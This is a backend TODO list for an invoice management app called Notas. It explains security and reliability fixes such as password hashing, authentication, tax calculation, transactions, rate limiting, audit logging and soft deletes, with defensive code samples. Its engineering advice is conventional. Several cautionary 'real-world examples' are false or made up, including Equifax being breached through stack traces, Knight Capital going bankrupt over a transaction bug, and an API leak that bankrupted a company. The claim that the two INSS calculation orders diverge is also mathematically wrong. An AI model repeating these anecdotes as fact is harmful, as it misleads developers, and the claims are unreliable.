# Backend TODO List

**Last Updated:** October 22, 2025  
**Project:** Notas - Invoice Management System

---

## 🔴 CRITICAL - Must Fix Before Production

### 1. Password Security - **URGENT**

**Priority:** P0  
**Effort:** 2-3 hours  
**Files Affected:**

- `src/services/user.service.ts`
- `src/app/api/users/route.ts`
- `package.json`

**Issue:** Passwords are stored in plain text in the database.

**🎓 Why This Matters:**
Imagine writing your bank password on a sticky note and leaving it on your desk. That's what storing passwords in plain text is like! If someone hacks your database (or even an employee looks at it), they can see everyone's passwords directly. This is extremely dangerous because:

- **People reuse passwords** - If someone's password is "MyPassword123" in your system, they probably use it for their email, bank, and social media too
- **Legal consequences** - Storing passwords in plain text can violate data protection laws (GDPR, LGPD in Brazil)
- **Loss of trust** - If users find out, they'll never trust your application again
- **Easy target** - Hackers specifically look for apps with plain text passwords because it's an easy way to steal accounts

**The solution:** Hashing is like putting the password through a one-way blender. You can't "unblend" it back to the original, but you can blend a new password the same way and compare the results. This way, even if someone steals your database, they can't read the actual passwords!

**Real-world example:** In 2013, Adobe had 153 million passwords stolen. Because they didn't hash them properly, hackers could read all of them. Don't be like Adobe!

**Action Items:**

- [ ] Install bcrypt: `npm install bcrypt @types/bcrypt`
- [ ] Update `UserService.createUser()` to hash passwords before storage
- [ ] Add password verification method to `UserService`
- [ ] Update user creation API to use hashed passwords
- [ ] Add migration script to hash existing passwords (if any)

**Code Example:**

```typescript
import bcrypt from "bcrypt";

export class UserService {
  async createUser(data: CreateUserSchema) {
    const hashedPassword = await bcrypt.hash(data.password, 10);
    return storage.user.createUser({
      ...data,
      password: hashedPassword,
    });
  }

  async verifyPassword(plainPassword: string, hashedPassword: string) {
    return await bcrypt.compare(plainPassword, hashedPassword);
  }
}
```

---

### 2. Authentication & Authorization

**Priority:** P0  
**Effort:** 1-2 days  
**Files Affected:**

- New: `src/middleware.ts`
- New: `src/lib/auth.ts`
- All API routes in `src/app/api/`
- `package.json`

**Issue:** All API endpoints are publicly accessible without authentication.

**🎓 Why This Matters:**
Right now, your API is like a house with no doors or locks - anyone can walk in and do whatever they want! Without authentication, anyone who knows your API URL can:

- **See all invoices** - Including sensitive financial data of all users
- **Delete everything** - A malicious user could delete all users, invoices, and suppliers
- **Create fake data** - Someone could flood your database with fake invoices
- **Steal information** - Competitor companies could see all your business transactions

**Authentication vs Authorization - What's the difference?**

- **Authentication** = "Who are you?" (Login with username/password)
- **Authorization** = "What are you allowed to do?" (Admin vs regular user)

Think of it like a hotel:

- **Authentication** is showing your ID at check-in to prove you're a guest
- **Authorization** is your room key only opening YOUR room, not the penthouse suite

**Why you need both:**

- Not every user should see everyone's invoices (privacy)
- Regular users shouldn't be able to delete other users (security)
- Only admins should manage suppliers and services (business rules)

**Real-world example:** In 2019, a company left their API without authentication. Someone found it, accessed 885 million financial records, and leaked them online. The company went bankrupt from lawsuits.

**Action Items:**

- [ ] Choose auth solution (NextAuth.js/Auth.js recommended)
- [ ] Install dependencies: `npm install next-auth`
- [ ] Create authentication configuration
- [ ] Add middleware to protect API routes
- [ ] Implement role-based access control (RBAC)
- [ ] Add JWT token generation and validation
- [ ] Protect sensitive endpoints (users, invoices, etc.)
- [ ] Add login/logout endpoints
- [ ] Update API error responses for unauthorized access

**Endpoints that need protection:**

- ✅ `/api/users` - Admin only
- ✅ `/api/invoices` - Authenticated users
- ✅ `/api/services` - Authenticated users
- ✅ `/api/suppliers` - Authenticated users

---

### 3. Fix Tax Calculation Logic

**Priority:** P0  
**Effort:** 2-4 hours  
**Files Affected:**

- `src/services/invoice.service.ts` (lines 19-30)

**Issue:** INSS calculation doesn't correctly handle material deduction, and CS/IRRF under R$10 threshold is not checked.

**🎓 Why This Matters:**
This is about **getting the math right** - and in financial software, wrong math can be VERY expensive! Your current code has two bugs that cause incorrect tax calculations:

**Bug #1 - Material Deduction:**
The law says: "Material costs should be deducted BEFORE calculating INSS tax."

Your code currently does:

1. Calculate INSS on total value = R$100 × 5% = R$5
2. Calculate INSS on material = R$30 × 5% = R$1.50
3. Subtract them = R$5 - R$1.50 = R$3.50 ✗ WRONG

Should be:

1. Subtract material first = R$100 - R$30 = R$70
2. Calculate INSS on result = R$70 × 5% = R$3.50 ✓ CORRECT

In this example, both get R$3.50, but with different percentages or values, the results diverge!

**Bug #2 - R$10 Minimum Threshold:**
Brazilian tax law says: "If a tax is less than R$10, don't charge it."

Your code currently charges even R$0.50 in taxes. This is wrong because:

- **You're overcharging customers** - Charging taxes they legally don't owe
- **Legal compliance** - You could be audited and fined for incorrect tax collection
- **Customer complaints** - Customers who know the law will notice and complain

**Why precision matters in financial software:**

- A bug that charges 1% extra doesn't sound bad, but on 10,000 invoices of R$1,000 each, that's R$100,000 in incorrect charges!
- Tax authorities can audit your system and fine you for calculation errors
- Users lose trust if they notice incorrect charges

**Real-world example:** A payroll company in the US had a tax rounding bug that cost them $50 million in corrections and lawsuits. Small math errors = big consequences!

**Action Items:**

- [ ] Fix INSS material deduction (material should be deducted BEFORE calculating INSS)
- [ ] Add R$10 minimum threshold check for CS/IRRF taxes
- [ ] Add unit tests for tax calculations
- [ ] Verify against DOCS.md specifications
- [ ] Test with various scenarios (high material, low taxes, etc.)

**Correct Logic:**

```typescript
// INSS - Material deduction BEFORE calculation
if (rates.inss) {
  const taxableValue = value - material;
  tax += (taxableValue * rates.inss) / 100;
}

// CS - R$10 minimum threshold
if (rates.cs) {
  const taxValue = (value * rates.cs) / 100;
  if (taxValue >= 1000) {
    // 1000 cents = R$10
    tax += taxValue;
  }
}

// IRRF - R$10 minimum threshold
if (rates.irrf) {
  const taxValue = (value * rates.irrf) / 100;
  if (taxValue >= 1000) {
    // 1000 cents = R$10
    tax += taxValue;
  }
}
```

---

### 4. Add Database Transactions

**Priority:** P0  
**Effort:** 3-4 hours  
**Files Affected:**

- `src/services/invoice.service.ts`
- `src/services/user.service.ts`
- Potentially other services with multiple DB operations

**Issue:** Multiple database queries without transactions can lead to data inconsistency.

**🎓 Why This Matters:**
A database transaction is like a shopping cart checkout - either ALL items go through, or NONE of them do. You can't have half a purchase!

**The Problem - Without Transactions:**
Your `createInvoice` function does 4 separate database operations:

1. Check if supplier exists
2. Check if service exists
3. Look up tax rates
4. Insert the invoice

What if your server crashes or internet disconnects between step 3 and step 4? You end up with:

- Verified data exists ✓
- BUT no invoice was created ✗
- User thinks invoice was created (because no error)
- Money is lost, records are incomplete

**Real-world analogy:**
Imagine transferring money between bank accounts:

- Step 1: Remove R$100 from your account ✓
- **[POWER OUTAGE]** 💥
- Step 2: Add R$100 to friend's account ✗ (Never happens!)

Without transactions, your R$100 disappears into the void! With transactions, the bank says "wait, step 2 failed, let me undo step 1" and your R$100 comes back.

**Database Transactions provide ACID properties:**

- **A**tomic - All steps complete, or none do (no half-done work)
- **C**onsistent - Data stays valid (no broken relationships)
- **I**solated - Two transactions don't interfere with each other
- **D**urable - Once committed, data is saved forever (even if server crashes)

**What can go wrong in your current code:**

- Invoice references a supplier that doesn't exist (data corruption)
- User pays but invoice isn't created (lost money)
- Two invoices created at same time cause number conflicts (duplicates)
- Partial data makes reports incorrect (wrong business decisions)

**Real-world example:** In 2012, Knight Capital's trading system had a transaction bug that caused 4 million trades to execute incorrectly in 45 minutes. They lost $440 million and went bankrupt. Transactions matter!

**Action Items:**

- [ ] Wrap `createInvoice` in a transaction
- [ ] Wrap multi-step operations in transactions
- [ ] Add rollback logic for failed operations
- [ ] Add tests for transaction behavior
- [ ] Document transaction boundaries

**Example:**

```typescript
async createInvoice(data: CreateInvoiceSchema) {
  return await db.transaction(async (tx) => {
    // All queries use tx instead of db
    const supplier = await tx.query.tableSuppliers.findFirst({...});
    const service = await tx.query.tableServices.findFirst({...});
    // If any query fails, entire transaction rolls back
    return await tx.insert(tableInvoices).values({...}).returning();
  });
}
```

---

## ⚠️ HIGH PRIORITY - Security & Data Integrity

### 5. Fix API Route Validation

**Priority:** P1  
**Effort:** 1-2 hours  
**Files Affected:**

- `src/app/api/invoices/route.ts`
- `src/app/api/suppliers/route.ts`
- `src/app/api/services/route.ts`

**Issue:**

- Invoice POST uses wrong schema (`insertInvoiceSchema` instead of `createInvoiceSchema`)
- Supplier/Service routes use wrong ID parameters

**🎓 Why This Matters:**
Validation is like a bouncer at a club - it checks if the data is "allowed in" before processing it. Using the wrong validation schema is like having a bouncer who checks the wrong list!

**Understanding the Schema Difference:**

- **`createInvoiceSchema`** - What the USER sends (missing auto-generated fields like ID, timestamps)
- **`insertInvoiceSchema`** - What goes INTO the database (includes ALL fields, even ones generated automatically)

**Why using the wrong schema is bad:**
If you validate with `insertInvoiceSchema`, users must provide:

- `id` (but the database auto-generates this!)
- `createdAt` (users shouldn't control when something was created!)
- Internal fields that should be calculated, not provided

This causes confusion:

- ❌ "Why do I need to provide an ID? I'm creating a new record!"
- ❌ Users could fake timestamps (create invoices dated in the past)
- ❌ Users could override calculated fields like `netAmountCents`

**The ID Parameter Bug:**
Your code currently does this:

```typescript
// In suppliers/route.ts
const { id, ...data } = body; // ✗ WRONG - suppliers use 'cnpj' not 'id'
```

This means:

- Trying to update a supplier? **Fails silently** because it looks for wrong field
- Data gets corrupted because ID is null/undefined
- Error messages don't make sense to users

**Think of it like addressing a letter:**

- Houses use street numbers: "123 Main St"
- Apartments use unit numbers: "Apt 4B"
- You can't use a house number to find an apartment!

Similarly:

- Invoices use `id` (number)
- Suppliers use `cnpj` (string like "12.345.678/0001-90")
- Services use `code` (string like "SRV-001")

**What happens without proper validation:**

- ✗ Crash the server with unexpected data types
- ✗ Insert invalid data into database (garbage in, garbage out)
- ✗ Security vulnerabilities (SQL injection, etc.)
- ✗ Confusing error messages for frontend developers

**Action Items:**

- [ ] Update invoice POST to use `createInvoiceSchema`
- [ ] Fix supplier PATCH/DELETE to use `cnpj` parameter
- [ ] Fix service PATCH/DELETE to use `code` parameter
- [ ] Add validation for all required fields
- [ ] Test all API endpoints with invalid data

---

### 6. Implement Rate Limiting

**Priority:** P1  
**Effort:** 2-3 hours  
**Files Affected:**

- New: `src/middleware.ts` (or extend existing)
- `package.json`

**Issue:** No protection against brute force or DoS attacks.

**🎓 Why This Matters:**
Rate limiting is like a "no more than 2 items per customer" rule at a store sale. It prevents one person from taking everything!

**What is a Denial of Service (DoS) attack?**
Imagine your API is a restaurant with 10 tables. A DoS attack is when someone:

1. Books all 10 tables under fake names
2. Never shows up
3. Real customers can't get in
4. Restaurant makes no money

For your API:

- Attacker sends 100,000 requests per second
- Your server is busy responding to fake requests
- Real users get "server timeout" errors
- Your hosting bill explodes (you pay for bandwidth!)

**What is a Brute Force attack?**
This is trying to guess passwords by attempting thousands of combinations:

```
Try: password123 ✗
Try: password124 ✗
Try: password125 ✗
... (repeat 10,000 times)
Try: MySecretPass ✓ (Got in!)
```

Without rate limiting:

- Attacker can try 1000 passwords per second
- 10-character password cracked in hours
- All user accounts compromised

With rate limiting (5 attempts per minute):

- Same password would take YEARS to crack
- Gives you time to notice suspicious activity
- Attacker gives up and moves to easier target

**Real-world costs of no rate limiting:**

1. **Server costs** - One attacker made a company's AWS bill go from $500 to $50,000 in one day
2. **Lost customers** - If real users can't access your app, they switch to competitors
3. **Data theft** - Unlimited requests let hackers download your entire database slowly
4. **API abuse** - Someone could use your API to train their AI model for free

**How rate limiting helps:**

- 🛡️ Protects against automated attacks
- 💰 Controls hosting costs (less traffic = cheaper bills)
- ⚖️ Fair usage for all users (no one hogs resources)
- 🚨 Detect suspicious behavior (if someone hits limit, they might be an attacker)

**Example attack scenario WITHOUT rate limiting:**

```
Attacker runs script: "Create 1 million fake invoices"
Result: Database full, app crashes, real data lost
```

**With rate limiting (10 requests per 10 seconds):**

```
Attacker creates 10 invoices → BLOCKED for 10 seconds
Attacker creates 10 more → BLOCKED again
Attacker gives up (would take 11 days to create 1 million)
```

**Action Items:**

- [ ] Choose rate limiting solution (Upstash Redis or similar)
- [ ] Install dependencies: `npm install @upstash/ratelimit @upstash/redis`
- [ ] Configure Redis connection
- [ ] Add rate limiting middleware
- [ ] Set appropriate limits per endpoint
- [ ] Return 429 status for rate limit exceeded
- [ ] Add rate limit headers to responses

**Suggested Limits:**

- POST endpoints: 10 requests per 10 seconds
- GET endpoints: 100 requests per minute
- Auth endpoints: 5 requests per minute

---

### 7. Add Audit Logging

**Priority:** P1  
**Effort:** 4-6 hours  
**Files Affected:**

- New: `src/db/schemas/audit-log.schema.ts`
- New: `src/services/audit.service.ts`
- All API routes (for logging)
- Database migration file

**Issue:** No audit trail for financial operations and data changes.

**🎓 Why This Matters:**
An audit log is like a security camera for your database - it records WHO did WHAT and WHEN. Without it, you're flying blind!

**Imagine this scenario:**

- Monday morning: Boss notices a R$100,000 invoice was deleted
- Boss asks: "Who deleted this? When? Why?"
- You check database: Invoice is gone, no record of who did it
- Result: Can't recover data, can't identify culprit, can't prevent it again

**With audit logging:**

- Log shows: "User John (ID: 42) deleted Invoice #1523 on Oct 21, 2025 at 3:47 PM"
- You contact John: "Oh sorry, I clicked wrong button by accident!"
- You restore the invoice from audit log's backup
- Crisis averted in 5 minutes!

**Why audit logs are CRITICAL for financial systems:**

1. **Legal Compliance**

   - Brazilian tax law (SPED) requires audit trails for all financial records
   - LGPD (Brazil's GDPR) requires tracking who accessed personal data
   - Without logs, you can be fined by authorities

2. **Security Investigations**

   - If someone hacks your system, logs show what they accessed
   - Can trace breach back to entry point
   - Helps prevent future attacks

3. **Dispute Resolution**

   - Customer says: "I never created that invoice!"
   - Log shows: Created from their IP address, at time they were logged in
   - Proves who did what

4. **Error Recovery**

   - Someone accidentally changes R$1,000 to R$10,000
   - Audit log has "before" value, easy to fix
   - Without it, you might not even notice the error!

5. **Insider Threat Detection**
   - Employee starts accessing lots of invoices they normally don't
   - Audit log patterns show suspicious behavior
   - You can investigate before data is stolen

**What to log in audit trail:**

- ✅ WHO: User ID, username, IP address
- ✅ WHAT: Action (create/update/delete), which table, which record
- ✅ WHEN: Exact timestamp
- ✅ BEFORE/AFTER: Old values and new values (for updates)
- ✅ WHY: Optional reason field (for manual changes)

**Real-world example:**
In 2016, the Bangladesh Bank heist, hackers stole $81 million. The bank had NO audit logs, so they couldn't figure out how the hack happened for weeks. With proper logging, they would have detected the breach in minutes.

**Common beginner mistakes:**

- ❌ "We'll add logging later" → Never happens, then you need it urgently
- ❌ Only logging errors → Also need to log successful operations
- ❌ Deleting old logs → Keep them! Hard drives are cheap, lawsuits are expensive
- ❌ Not logging who made changes → Useless log that can't identify culprits

**Action Items:**

- [ ] Create audit log schema
- [ ] Generate and run migration
- [ ] Create audit service
- [ ] Add audit logging to create/update/delete operations
- [ ] Log user actions (who did what, when)
- [ ] Store before/after data for updates
- [ ] Add audit log query endpoints (admin only)
- [ ] Consider data retention policies

**Schema:**

```typescript
export const tableAuditLog = pgTable("audit_log", {
  id: serial("id").primaryKey(),
  userId: text("user_id").notNull(),
  action: text("action").notNull(), // CREATE, UPDATE, DELETE
  tableName: text("table_name").notNull(),
  recordId: text("record_id").notNull(),
  oldData: jsonb("old_data"),
  newData: jsonb("new_data"),
  ipAddress: text("ip_address"),
  userAgent: text("user_agent"),
  createdAt: timestamp("created_at").notNull().defaultNow(),
});
```

---

### 8. Implement Soft Deletes

**Priority:** P1  
**Effort:** 3-4 hours  
**Files Affected:**

- All schema files in `src/db/schemas/`
- All storage files in `src/storage/`
- Database migration file

**Issue:** Hard deletes permanently remove financial records (bad for compliance).

**🎓 Why This Matters:**
Think of the difference between throwing a document in the trash vs. burning it:

- **Hard Delete (current)** = Burning → Gone forever, can't undo
- **Soft Delete (recommended)** = Trash can → Can still recover if needed

**The Problem with Hard Deletes:**

When you delete an invoice, it's GONE from the database. But what if:

- ❌ User clicked delete by accident → Can't undo
- ❌ Boss asks "What invoices did we delete last month?" → No way to know
- ❌ Tax auditor says "Show me invoice #12345" → "Sorry, it was deleted" = BIG FINE
- ❌ Need to restore data from backup → Have to restore entire database

**How Soft Delete Works:**

Instead of actually deleting the record, you just mark it as deleted:

```typescript
// Hard Delete (BAD):
DELETE FROM invoices WHERE id = 123;  // GONE FOREVER! 💀

// Soft Delete (GOOD):
UPDATE invoices SET deleted_at = '2025-10-22' WHERE id = 123;  // Still in database! ✓
```

The invoice is still in the database, but your app treats it as deleted:

```typescript
// Normal query only shows non-deleted records:
SELECT * FROM invoices WHERE deleted_at IS NULL;
```

**Benefits of Soft Deletes:**

1. **Easy Recovery**

   ```typescript
   // Oops! Restore it:
   UPDATE invoices SET deleted_at = NULL WHERE id = 123;
   ```

2. **Compliance**

   - Tax authorities: "Show us ALL invoices, including deleted ones"
   - You: "Sure! Here they are" → No problem!

3. **Data Analytics**

   - "How many invoices were deleted this month?"
   - "What's the most commonly deleted item?"
   - Can't analyze what doesn't exist!

4. **Legal Protection**

   - Customer sues: "You lost my invoice!"
   - You prove: "No, you deleted it on Oct 15th at 2:30 PM, here's the record"

5. **Referential Integrity**
   - Invoice has payments, attachments, audit logs
   - Hard delete breaks all these relationships
   - Soft delete keeps everything connected

**Real-world example:**
A hospital permanently deleted patient records to "save space". Later, those patients sued for malpractice. Hospital couldn't defend itself because they had no records. They lost millions in lawsuits. Never permanently delete important data!

**When is Hard Delete appropriate?**

- ✓ Test data / demo accounts
- ✓ Spam / malicious content
- ✓ Temporary cache / session data
- ✗ NEVER for financial records, user data, or anything compliance-related

**Implementation Strategy:**
Add to EVERY important table:

```typescript
deletedAt: timestamp("deleted_at"),      // When was it deleted?
deletedBy: integer("deleted_by"),         // Who deleted it?
deletionReason: text("deletion_reason"),  // Why was it deleted?
```

**Common beginner question:** "Won't this make my database huge?"

- Answer: Yes, but hard drives are cheap! A million invoice records is maybe 100 MB.
- Compare cost: $1/month extra storage vs. $100,000 fine for missing records
- You can archive very old deleted records to separate storage if needed

**Action Items:**

- [ ] Add `deletedAt` timestamp field to all tables
- [ ] Generate and run migration
- [ ] Update delete methods to set `deletedAt` instead of removing records
- [ ] Add filters to exclude deleted records from queries
- [ ] Add "restore" functionality for soft-deleted records
- [ ] Create admin endpoint to view deleted records
- [ ] Update documentation

**Migration Priority:**

1. invoices (most critical)
2. suppliers
3. services
4. users

---

### 9. Improve Error Handling

**Priority:** P1  
**Effort:** 2-3 hours  
**Files Affected:**

- New: `src/lib/error-handler.ts`
- All API routes in `src/app/api/`

**Issue:** Error handling exposes internal details and lacks consistency.

**🎓 Why This Matters:**
Error messages are like a map for hackers. You want to be helpful to users, but not give away secrets to attackers!

**The Two Audiences Problem:**

When an error happens, you have two very different audiences:

1. **Your development team** (needs ALL details):

   - Exact database query that failed
   - Full stack trace
   - Environment variables
   - User ID, timestamp, request data

2. **End users / Hackers** (should see minimal info):
   - Generic "Something went wrong"
   - Maybe a friendly hint like "Invalid email format"
   - Definitely NOT database internals!

**What's wrong with your current error handling:**

```typescript
// Current code (BAD):
catch (error) {
  console.error(error);  // Only shows in server logs
  return NextResponse.json(
    { error: "Failed to create invoice" },  // Too vague for users
    { status: 500 }
  );
}
```

Problems:

- ❌ User has no idea WHY it failed (validation? server down? wrong data?)
- ❌ Developer has no context (which invoice? which user? what was the data?)
- ❌ All errors look the same (can't distinguish between user error vs. server error)

**Security Risk - Information Disclosure:**

Bad error messages can expose:

```typescript
// DANGER! Don't do this:
return NextResponse.json({
  error: error.message, // Might be "Database 'invoices' not found at 192.168.1.50"
});
```

This tells hackers:

- 🚨 Your database structure
- 🚨 Your internal IP addresses
- 🚨 What libraries you're using
- 🚨 Potential vulnerabilities to exploit

**Real-world hack example:**
In 2017, Equifax (credit bureau) exposed stack traces in error messages. Hackers used this information to understand the system architecture and stole data of 147 million people. The company paid $700 million in fines.

**The Right Way - Different Messages for Different Contexts:**

```typescript
// For validation errors (user's fault):
{
  error: "Validation failed",
  details: [
    { field: "email", message: "Email format is invalid" },
    { field: "value", message: "Must be greater than 0" }
  ]
}
// ✓ Helpful for user to fix their mistake
// ✓ Doesn't expose system internals

// For system errors (server's fault):
{
  error: "Internal server error",
  message: "Please try again later or contact support",
  errorId: "ERR-2025-10-22-1547"  // So support can look up details
}
// ✓ Doesn't confuse user with technical details
// ✓ Gives support team a way to track down the issue
// ✓ Doesn't expose database/code structure to hackers
```

**Error Types You Should Handle Differently:**

1. **Validation Errors** (400) - User sent bad data
   - Show WHAT was wrong so they can fix it
   - "Email is required" ✓
2. **Authentication Errors** (401) - Not logged in

   - "Please log in to continue" ✓
   - NOT "User not found in database" ✗ (tells hackers the username was wrong)

3. **Authorization Errors** (403) - Logged in but can't do this
   - "You don't have permission to delete invoices" ✓
4. **Not Found Errors** (404) - Resource doesn't exist
   - "Invoice #123 not found" ✓
5. **Server Errors** (500) - Something broke on your end
   - "Internal server error" ✓
   - Log full details server-side only
   - NOT "Database connection failed at line 42 in invoice.service.ts" ✗

**Why consistent error handling matters:**

Without it:

- Frontend developers can't predict error format → Harder to show nice error messages
- Some errors crash the app → Bad user experience
- No way to track common errors → Can't improve the system
- Each developer handles errors differently → Messy codebase

**Action Items:**

- [ ] Create centralized error handler utility
- [ ] Define error types and status codes
- [ ] Sanitize error messages for clients
- [ ] Keep detailed logging server-side only
- [ ] Add Zod validation error formatting
- [ ] Add database error handling
- [ ] Implement error monitoring (Sentry, LogRocket, etc.)
- [ ] Document error response format

**Error Handler Example:**

```typescript
export function handleApiError(error: unknown) {
  if (error instanceof ZodError) {
    return NextResponse.json(
      { error: "Validation error", details: error.errors },
      { status: 400 }
    );
  }

  if (error instanceof DatabaseError) {
    console.error("[Database Error]", error);
    return NextResponse.json(
      { error: "Database operation failed" },
      { status: 500 }
    );
  }

  console.error("[Unexpected Error]", error);
  return NextResponse.json({ error: "Internal server error" }, { status: 500 });
}
```

---

## 🟡 MEDIUM PRIORITY - Code Quality & Maintainability

### 10. Standardize API Response Format

**Priority:** P2  
**Effort:** 2-3 hours  
**Files Affected:**

- New: `src/types/api.types.ts`
- All API routes

**🎓 Why This Matters:**
Imagine if every restaurant gave you food in different containers - sometimes a plate, sometimes a box, sometimes just wrapped in paper. It would be confusing! APIs need consistency too.

**The Problem - Inconsistent Responses:**

Your current API returns different formats:

```typescript
// Success response 1:
{ id: 1, name: "Invoice" }

// Success response 2:
[{ id: 1 }, { id: 2 }]

// Error response 1:
{ error: "Not found" }

// Error response 2:
{ message: "Failed" }
```

Frontend developer's nightmare:

- "Wait, is the data in a 'data' field or at the root?"
- "Are errors in 'error' or 'message' field?"
- "Is this an array or single object?"

**Why standardization helps:**

1. **Frontend code is simpler:**

```typescript
// Without standard format (BAD):
const response = await fetch("/api/invoices");
const data = await response.json();
// Is it data.invoices? data.data? Just data? Who knows! 🤷

// With standard format (GOOD):
const response = await fetch("/api/invoices");
const { data, error } = await response.json();
if (error) {
  showError(error);
} else {
  showInvoices(data); // Always in same place!
}
```

2. **TypeScript works better:**

```typescript
// Frontend knows exactly what to expect:
type ApiResponse<T> = {
  success: boolean;
  data?: T;
  error?: string;
};

// Now TypeScript autocomplete works!
const response: ApiResponse<Invoice[]> = await getInvoices();
```

3. **Easier to add features:**

```typescript
// Want to add pagination? Easy with standard format:
{
  success: true,
  data: [...invoices...],
  meta: {
    page: 1,
    totalPages: 10,
    total: 100
  }
}
```

**Real-world example:**
GitHub API, Stripe API, Twitter API - all successful APIs use consistent formats. Developers love them because they're predictable!

**Standard Format Benefits:**

✅ **Predictable** - Always know where to find data  
✅ **Type-safe** - TypeScript can catch errors  
✅ **Extensible** - Easy to add metadata later  
✅ **Professional** - Shows you know what you're doing  
✅ **Less bugs** - Frontend doesn't have to guess structure

**Action Items:**

- [ ] Define standard response types
- [ ] Add pagination support
- [ ] Add metadata to responses
- [ ] Implement consistent error responses
- [ ] Update all endpoints to use standard format
- [ ] Document API response structure

**Standard Response:**

```typescript
export type ApiResponse<T> = {
  success: boolean;
  data?: T;
  error?: string;
  message?: string;
};

export type PaginatedResponse<T> = ApiResponse<T[]> & {
  meta: {
    page: number;
    perPage: number;
    total: number;
    totalPages: number;
  };
};
```

---

### 11. Add Request Validation Middleware

**Priority:** P2  
**Effort:** 2 hours  
**Files Affected:**

- New: `src/lib/validation.ts`
- All API routes

**🎓 Why This Matters:**
Middleware is like a security checkpoint at an airport. Instead of checking passports at every gate, you check once at the entrance. Much more efficient!

**The Problem - Repeated Code:**

Look at your API routes - they all do this:

```typescript
// invoices/route.ts
export async function POST(req: Request) {
  try {
    const body = await req.json();
    const data = createInvoiceSchema.parse(body); // ← Repeated
    // ... do work
  } catch (error) {
    // ... handle error  // ← Repeated
  }
}

// suppliers/route.ts
export async function POST(req: Request) {
  try {
    const body = await req.json();
    const data = createSupplierSchema.parse(body); // ← Repeated
    // ... do work
  } catch (error) {
    // ... handle error  // ← Repeated
  }
}
```

Same pattern in EVERY route! This is called "boilerplate code" - code you copy-paste everywhere.

**Problems with repeated code:**

1. **Hard to maintain**

   - Want to change error format? Update 10 files!
   - Miss one file? Now you have inconsistent behavior

2. **Easy to make mistakes**

   - Forget try-catch in one route → App crashes
   - Typo in one error handler → Confusing error messages

3. **Harder to read**
   - Business logic buried in validation code
   - New developers get confused

**The Solution - Middleware:**

Write validation logic ONCE, use everywhere:

```typescript
// validation.ts (write once)
export function validateRequest<T>(schema: ZodSchema<T>) {
  return async (req: Request) => {
    const body = await req.json();
    return schema.parse(body);
  };
}

// invoices/route.ts (clean and simple!)
export async function POST(req: Request) {
  const data = await validateRequest(createInvoiceSchema)(req);
  const invoice = await service.invoice.createInvoice(data);
  return NextResponse.json(invoice);
}
```

**Benefits of middleware:**

✅ **DRY Principle** - Don't Repeat Yourself  
✅ **Easier to test** - Test validation logic once, not 10 times  
✅ **Consistent behavior** - All routes handle validation the same way  
✅ **Cleaner code** - Routes focus on business logic, not validation  
✅ **Easier to change** - Update one file, fix everywhere

**Other uses for middleware:**

Beyond validation, you can create middleware for:

- 🔐 Authentication checking
- 📊 Logging requests
- ⏱️ Rate limiting
- 🔍 Sanitizing inputs
- 📏 Checking content-length
- 🌍 CORS headers

**Real-world analogy:**

Without middleware:

```
Enter building → Show ID to receptionist
Go to floor 2 → Show ID to guard
Enter office A → Show ID to secretary
Enter conference room → Show ID to manager
```

Showing ID 4 times is annoying and inefficient!

With middleware:

```
Enter building → Show ID to receptionist (verified!)
Go anywhere → ID already checked ✓
```

Check once, trusted everywhere!

**Common beginner question:** "Won't middleware make my code slower?"

- Answer: No! It's the SAME code, just organized better
- You're doing validation either way
- Middleware just puts it in one place instead of scattered around

**Action Items:**

- [ ] Create reusable validation middleware
- [ ] Add schema validation wrapper
- [ ] Add custom validation error responses
- [ ] Refactor API routes to use middleware
- [ ] Add validation for query parameters
- [ ] Add validation for URL parameters

---

### 12. Add Database Connection Pooling

**Priority:** P2  
**Effort:** 1 hour  
**Files Affected:**

- `src/db/db.ts`

**🎓 Why This Matters:**
Imagine a restaurant with one waiter serving 100 customers. Everyone waits forever! Connection pooling is like hiring more waiters to serve customers faster.

**What is a database connection?**

Every time your app talks to the database, it needs a "connection" - like a phone call:

1. Pick up phone (open connection) - Takes time!
2. Talk (run query) - Fast!
3. Hang up (close connection) - Takes time!

**The Problem - Without Connection Pooling:**

Every API request does this:

```typescript
// Request 1:
Open connection (500ms)  ← Slow!
Run query (10ms)         ← Fast!
Close connection (100ms) ← Slow!

// Request 2:
Open connection (500ms)  ← Slow again!
Run query (10ms)
Close connection (100ms)
```

Total time: 1,220ms for something that should take 20ms!

**The Solution - Connection Pooling:**

Keep connections open and reuse them:

```typescript
// App startup:
Create 20 connections and keep them ready

// Request 1:
Grab connection from pool (1ms)   ← Almost instant!
Run query (10ms)
Return connection to pool (1ms)

// Request 2:
Grab connection from pool (1ms)   ← Reuses connection!
Run query (10ms)
Return connection to pool (1ms)
```

Same work: 24ms instead of 1,220ms - **50x faster!**

**Real-world analogy:**

**Without pooling** - Like renting a car every time you need to go somewhere:

1. Go to rental office
2. Fill out paperwork
3. Get car
4. Drive 5 minutes
5. Return car, more paperwork
6. Need to go again? Start over!

**With pooling** - Like owning a car:

1. Walk to your driveway
2. Get in car (already yours!)
3. Drive
4. Come back, park in driveway
5. Car ready for next trip!

**Why it matters for your app:**

Without pooling:

- ❌ Each request takes 500ms+ just to connect
- ❌ Database gets overwhelmed with connection requests
- ❌ Under heavy load, database refuses new connections
- ❌ App crashes with "too many connections" error

With pooling:

- ✅ Requests are 10-50x faster
- ✅ Database handles load better
- ✅ Predictable performance
- ✅ App scales to more users

**Pool Configuration Settings:**

```typescript
{
  max: 20,  // Maximum connections in pool
  // Why 20? Most databases handle 100-200 connections total
  // If you have 5 app servers, each gets 20 = 100 total ✓

  idleTimeoutMillis: 30000,  // Close unused connections after 30s
  // Why? No point keeping 20 connections open at 3 AM when no one is using the app

  connectionTimeoutMillis: 2000,  // Wait max 2s for available connection
  // Why? If no connection available after 2s, something is wrong
}
```

**What happens when all connections are busy?**

Scenario: 20 connections in pool, 25 simultaneous requests

Requests 1-20: Get connections immediately ✓  
Requests 21-25: Wait in queue  
As soon as request 1 finishes → Request 21 gets that connection  
Fair and efficient!

**Common beginner mistakes:**

❌ **Too many connections** (`max: 1000`)

- Database crashes from overload
- Most connections sit idle (waste of memory)

❌ **Too few connections** (`max: 1`)

- Entire app bottlenecks on one connection
- Like single checkout line at grocery store

❌ **No timeout** (`connectionTimeoutMillis: Infinity`)

- If something goes wrong, requests wait forever
- Users see infinite loading spinners

✓ **Just right:** 10-50 connections depending on traffic

**Action Items:**

- [ ] Configure connection pool limits
- [ ] Add connection timeout settings
- [ ] Add idle timeout configuration
- [ ] Monitor connection pool usage
- [ ] Document configuration

---

### 13. Add Comprehensive Unit Tests

**Priority:** P2  
**Effort:** 1-2 weeks  
**Files Affected:**

- New: `__tests__/` directory structure
- New: `jest.config.js` or `vitest.config.ts`
- `package.json`

